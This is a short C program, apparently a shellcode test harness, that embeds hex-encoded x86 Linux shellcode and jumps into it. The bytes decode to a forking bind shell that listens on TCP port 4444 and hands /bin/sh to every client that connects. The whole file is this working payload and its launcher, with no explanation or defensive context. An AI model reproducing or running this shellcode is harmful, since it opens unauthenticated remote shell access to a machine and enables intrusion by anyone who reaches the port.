#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x05\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x75\x49\x31\xc0\xb0\x06\x89\xfb\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb1\x01\xfe\xc9\x31\xc9\x88\xca\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\xeb\x90";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
